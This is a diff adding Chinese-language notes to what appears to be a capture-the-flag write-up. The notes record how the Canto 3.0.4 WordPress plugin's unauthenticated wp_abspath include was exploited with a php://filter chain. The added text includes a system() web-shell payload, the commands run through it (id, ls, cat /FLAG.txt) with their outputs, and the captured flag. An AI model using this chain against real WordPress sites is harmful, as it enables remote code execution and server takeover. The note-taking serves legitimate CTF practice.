@@ -129,3 +129,24 @@ GET …?abspath=/                                                              -
 - `copy-media.php` 用 `data://text/plain;base64,...` 作为 `abspath` → 500（0 字节），
   说明路径解析到 `require` 阶段但 `allow_url_include` 不可用/后缀拼接破坏 payload。
 - 未拿到管理员口令：候选口令（含其他题解里出现的 `ONEverySecurePassword123!`）均失败。
+
+## 解出（2026-10-28）：`wp_abspath` + php://filter 链
+
+之前一直卡在「`require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php')` 后缀固定」。
+转机是把 `wp_abspath` 当成**流 URI 前缀**来用：
+
+- 先验证 include 生效：payload `<?php echo 'MARK123'; ?>` 生成 filter chain，
+  `wp_abspath=<chain>/resource=php://temp` → 响应体开头出现 `MARK123`（HTTP 500，但代码已执行）。
+- 再把 payload 换成 `<?=system($_GET[0]);?>`，命令走 query：
+  - `0=id` → `uid=33(www-data)`
+  - `0=ls -la /` → 根目录有 `FLAG.txt`（42 字节）
+  - `0=cat /FLAG.txt` → `flag{7bc5fa65-03bc-48d3-bde7-a5ce620d679c}`
+
+补充事实：
+- `wp-content/uploads/2024/06/canto.3.0.4.zip` 与 wordpress.org 官方 3.0.4 用 `diff -rq`
+  比较**完全一致**，没有后门；所以入口就是官方源码里 `includes/lib/*.php` 的
+  `require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php')`。
+- 直接给 `wp_abspath=/var/www/html` 会 302 到 wp-login（`auth_redirect()`），
+  这正是之前误判「需要管理员口令」的原因；用 `php://filter` 前缀时根本不会加载 WP bootstrap。
+- 也解释了为什么 `/wp-json` 不存在、`xmlrpc.php` 恒 -32700：这套实例的 WP 是被
+  精简过的，考点完全在插件侧。
